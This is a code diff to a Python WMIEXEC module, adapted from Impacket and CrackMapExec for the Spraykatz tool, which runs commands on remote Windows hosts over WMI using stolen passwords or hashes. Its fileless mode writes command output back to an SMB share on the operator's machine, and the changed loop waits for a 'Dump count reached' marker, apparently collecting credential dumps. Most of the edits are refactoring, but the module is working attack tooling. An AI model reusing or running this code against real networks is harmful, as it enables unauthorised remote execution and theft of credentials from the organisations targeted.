@@ -1,12 +1,16 @@
-import ntpath, logging
-import os, sys
+# coding: utf-8
+#
+# This file comes from Impacket & CrackMapExec project
+# Slightly modified for Spraykatz.
 
-from gevent import sleep
 
-import random, string
+# Imports
+import os, sys, logging, ntpath, time
+from core.Utils import *
 from impacket.dcerpc.v5.dcomrt import DCOMConnection
 from impacket.dcerpc.v5.dcom import wmi
 from impacket.dcerpc.v5.dtypes import NULL
+
 
 class WMIEXEC:
     def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None, share=None):
@@ -77,7 +81,7 @@ class WMIEXEC:
             self.execute_remote(data)
 
     def execute_remote(self, data):
-        self.__output = '\\Windows\\Temp\\' + ''.join(random.sample(string.ascii_letters, 6))
+        self.__output = '\\Windows\\Temp\\' + gen_random_string(6)
         command = self.__shell + data
         if self.__retOutput:
             command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
@@ -86,7 +90,7 @@ class WMIEXEC:
         self.get_output_remote()
 
     def execute_fileless(self, data):
-        self.__output = ''.join(random.sample(string.ascii_letters, 6))
+        self.__output = gen_random_string(6)
         local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]
         command = self.__shell + data + ' 1> \\\\{}\\tmp\\{} 2>&1'.format(local_ip, self.__output)
         logging.debug('Executing command: ' + command)
@@ -97,10 +101,14 @@ class WMIEXEC:
         while True:
             try:
                 with open(os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'tmp', self.__output), 'r') as output:
-                    self.output_callback(output.read())
-                break
+                    out = output.read()
+                    if "Dump count reached" in out:
+                    	self.output_callback(output.read())
+                    	break
+                    else:
+                    	time.sleep(0.5)
             except IOError:
-                sleep(2)
+                time.sleep(2)
 
     def get_output_remote(self):
         if self.__retOutput is False:
@@ -113,7 +121,7 @@ class WMIEXEC:
                 break
             except Exception as e:
                 if str(e).find('STATUS_SHARING_VIOLATION') >=0:
-                    sleep(2)
+                    time.sleep(2)
                     pass
                 else:
                     pass
